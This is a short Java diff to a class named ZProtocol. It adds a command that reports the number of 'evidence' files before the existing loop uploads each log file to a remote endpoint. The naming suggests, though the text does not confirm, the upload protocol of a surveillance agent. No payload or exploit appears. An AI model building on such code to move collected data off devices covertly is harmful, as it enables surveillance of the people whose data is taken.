@@ -754,6 +754,14 @@ public class ZProtocol extends Protocol {
             //#ifdef DEBUG
             debug.trace("    dir: " + dir + " #evidences: " + lsize); //$NON-NLS-1$ //$NON-NLS-2$
             //#endif
+            
+            // Evidence SIZE
+            byte[] plainOut = new byte[4 + 8];
+            Utils.copy(plainOut, 0, Utils.intToByteArray(lsize),
+                    0, 4);
+            byte[] response = command(Proto.EVIDENCE_SIZE, plainOut);
+            checkOk(response);
+            
             for (int j = 0; j < lsize; ++j) {
                 final String logName = (String) logs.elementAt(j);
                 final String fullLogName = basePath + dir + logName;
@@ -771,12 +779,12 @@ public class ZProtocol extends Protocol {
                         + fullLogName);
                 //#endif
 
-                byte[] plainOut = new byte[content.length + 4];
+                plainOut = new byte[content.length + 4];
                 Utils.copy(plainOut, 0, Utils.intToByteArray(content.length),
                         0, 4);
                 Utils.copy(plainOut, 4, content, 0, content.length);
 
-                byte[] response = command(Proto.LOG, plainOut);
+                response = command(Proto.LOG, plainOut);
                 plainOut = null;
 
                 boolean ret = parseLog(response);
